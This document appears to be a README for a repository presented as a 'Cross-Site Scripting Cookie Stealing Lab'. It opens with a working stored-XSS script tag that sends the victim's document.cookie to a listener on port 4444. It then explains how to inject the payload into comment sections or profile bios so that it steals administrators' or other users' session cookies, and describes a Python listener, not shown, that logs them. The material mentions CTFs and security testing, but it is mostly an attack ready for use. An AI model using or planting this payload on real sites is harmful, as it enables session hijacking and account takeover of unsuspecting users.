<script>
var i = new Image;
i.src = "http://0.0.0.0:4444/?" + document.cookie;
</script>

-------------------------------------------------------------------------------------------






Cross-Site Scripting (XSS) Cookie Stealing Lab
This setup demonstrates a Stored XSS attack used to hijack session cookies. The process involves two main components: a malicious payload and a listener script.

The Payload (Client-Side):
The small <script> snippet is the malicious payload. This script must be injected into a vulnerable website (for example, in a comment section or a profile bio). Once a victim—such as an Administrator or another user—visits the page where this payload is stored, the script executes automatically in their browser. It creates a new image object and sets its source to the attacker's IP address, appending the victim's document.cookie as a URL parameter.

The Listener (Attacker-Side):
The Python script acts as a simple HTTP server that must be running on the attacker’s computer. It is configured to listen on port 4444. When the victim's browser tries to "load the image" from the payload, it sends a GET request to this server. The Python script then captures and prints the request headers and the query string, effectively logging the victim's private cookies for the attacker to see.




# python-script_xss-cookie-stealer-
Lightweight Python HTTP server for logging incoming requests (headers, IP, user-agent, and query params). Useful for debugging, CTFs, and security testing.
